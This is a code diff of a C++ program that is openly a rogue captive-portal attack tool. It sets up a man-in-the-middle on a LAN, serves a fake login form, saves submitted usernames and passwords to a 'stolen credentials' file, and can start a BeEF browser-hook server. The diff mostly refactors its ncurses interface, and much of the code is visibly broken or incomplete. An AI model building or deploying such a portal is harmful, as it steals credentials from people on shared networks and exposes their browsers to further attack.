@@ -22,7 +22,7 @@
 
 //currently refactoring to colorprint to the output_buffer
 
-//g++ -L/usr/include/boost/program_options.hpp ./main.cpp -o ./main.o -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lboost_process -lboost_network
+//g++ ./main.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses
 //namespace process = boost::process;
 using namespace std;
 using namespace httpserver;
@@ -47,13 +47,14 @@ std::string remote_ip;
 std::string beef_hook;
 std::string addr;
 std::string iface;
+std::vector<string> output_buffer;
+std::vector<char> input_buffer;
+bool INPUT_FLAG = true;
+
 WINDOW* window;
 WINDOW* output_window;
 WINDOW* input_window;
 int row = 0, col = 0;
-std::vector<string> output_buffer;
-std::vector<char> input_buffer;
-std::bool INPUT_FLAG;
 
 void colorprint(std::string color, std::string text) {
     if (color == "red"){
@@ -76,7 +77,7 @@ void colorprint(std::string color, std::string text) {
 };
 
 void term_init(){
-    win = initscr();
+    window = initscr();
     getmaxyx(window, row, col);
     cbreak();
     noecho();
@@ -90,10 +91,18 @@ void errprint(auto err) {
     colorprint("red" , err);
 };
 
-
 void update_output_window(std::string output_string ){
     touchwin(window);
-    str += '\n';
+    output_string += "\n";
+    wprintw(output_window, output_string.c_str());
+    wrefresh(output_window);
+// once we update the output window we want to allow the user to input more commands
+// so we set the flag to false again
+};
+
+void update_output_windowfrominput(std::string output_string ){
+    touchwin(window);
+    output_string += "\n";
     wprintw(output_window, output_string.c_str());
     wrefresh(output_window);
 // once we update the output window we want to allow the user to input more commands
@@ -101,17 +110,9 @@ void update_output_window(std::string output_string ){
     INPUT_FLAG = false;
 };
 
-void update_input_window(std::string input){
-    touchwin(window);
-    str += '\n';
-    wprintw(input_window, input.c_str() );
-    wrefresh(output_window);
-
-};
-
 void process_output_buffer(){
-    std::string output_window_string(output_buffer.begin(),output_buffer.end())
-    update_output_window(output_window_string)
+   // std::string output_window_string(output_buffer.begin(),output_buffer.end());
+   // update_output_window(output_window_string.c_str());
 };
 
 string get_command(){
@@ -119,26 +120,26 @@ string get_command(){
         char input_character = getch();
         //if we hit the enter key, it processes the input buffer to send to the output buffer to send to the output window
         if(input_character = '\r'){
-            std::string input_buffer_string(input_buffer.begin(),input_buffer.end())
-            process_output_buffer();
-            update_output_window(input_buffer_string + "\n");
-            INPUT_FLAG = true;
+            std::string input_buffer_string(input_buffer.begin(),input_buffer.end());
+            update_output_windowfrominput(input_buffer_string);
+            INPUT_FLAG = false;
         } else {
             //else we keep taking chars and checking for the backspace
             touchwin(window);
             input_buffer.push_back(input_character);
-            waddch(input_window, input_character);
-            if (input_character == KEY_BACKSPACE) { input_buffer.pop_back(); update_input_window() };
+            // add the character to the input line in the terminal window
+            if (input_character == KEY_BACKSPACE) {
+                input_buffer.pop_back();
+
+            };
         };
-    };
     std::string command(input_buffer.begin(),input_buffer.end());
     input_buffer.clear();
     return command;
+    };
 };
 
-
-
-void make_html(std::string hook_loc, std::string formaction){
+void make_html(std::string hook_loc, std::string formaction) {
     std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
     std::string html_form_body_top = "<body><form class=\"login\" ";
     std::string form_action = "action=\"" + formaction + "\" ";
@@ -159,8 +160,7 @@ void make_html(std::string hook_loc, std::string formaction){
 
 
 int parse_commandline(int argc, char* argv[]){
-    options::options_description desc("Captive portal server, very insecure and not for beginners, if you have a problem, solve it.\n\
-                                      If you get hacked while using this, too bad. There is no help on this , read the source code");
+    options::options_description desc("Captive portal server");
     desc.add_options()
         ("help,h", "Print Help Message" )
         ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
@@ -169,9 +169,7 @@ int parse_commandline(int argc, char* argv[]){
         ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
         ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
         ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
-        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server if using an external html, you must modify \n\
-                                                                                the source of the portal you wish to use to be successful. Serves a subdirectory \n\
-                                                                                of the PWD the program runs in")
+        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server ")
 
     ;
     options::variables_map arguments;
@@ -190,14 +188,15 @@ int parse_commandline(int argc, char* argv[]){
     if (arguments.count("beef-hook") == 'true') {
         hook_location = arguments["address"].as<std::string>();
         hook_location = hook_location + ":3000";
-        system("service beef start")
+        system("service beef start");
     } else {
         hook_location = "";
     };
     if (arguments.count("external-html") == 'true') {
-        auto pwd = filesystem::current_path();
-        document_root = pwd + arguments
+        //auto pwd = filesystem::current_path();
+        //document_root = pwd + arguments
     };
+
     document_root = arguments["document-root"].as<std::string>();
     credentials_file = arguments["credentials"].as<std::string>();
     PORT = arguments["port"].as<int>();
@@ -208,7 +207,7 @@ int parse_commandline(int argc, char* argv[]){
 class CaptivePortal : public http_resource {
 public:
     const std::shared_ptr<http_response> render_GET(const http_request& request) {
-        colorprint("yellow", ("redirecting %remoteip to portal", ))
+        colorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
         return std::shared_ptr<http_response>(new string_response(html_redirect_body));
     };
 
@@ -216,7 +215,7 @@ public:
         remote_ip = request.get_requestor();
 
         authpassthrough(remote_ip);
-        colorprint("green", ("Host %host Authorized", remote_ip))
+        colorprint("green", ("Host %host Authorized", remote_ip));
         save_credentials(request.get_user(), request.get_pass());
         return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
     };
@@ -331,36 +330,34 @@ int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
 
 };
 int main(int argc, char* argv[]) {
-    ninit();
-    auto pwd = filesystem::current_path();
+    term_init();
+    //auto pwd = filesystem::current_path();
 
-    parse_commandline(argc, argv);
+    //parse_commandline(argc, argv);
     fflush(stdin);
 
     start_server();
 
     INPUT_FLAG = true;
-    output_window = subwin(win, row - 1, col, 0, 0);
+    output_window = subwin(window, row - 1, col, 0, 0);
 
     scrollok(output_window, true);
     input_window = subwin(window, 1, col, row - 1, 0);
 
     std::thread input_line(get_command);
-    std::thread nthr(nmonitor);
+    //std::thread nthr(nmonitor);
 
     while(1)
     {
-        std::string input(throw_command());
-        if(input == "quit")
+        std::string input(get_command());
+        if(input == "quit"){
             break;
-        else
-            update_user_input("[root@moopframe:> %s", input.c_str());
-    }
-
-    getch();
+        } else {
+            get_command();
+        };
     endwin();
+    };
 };
-
 
 
 
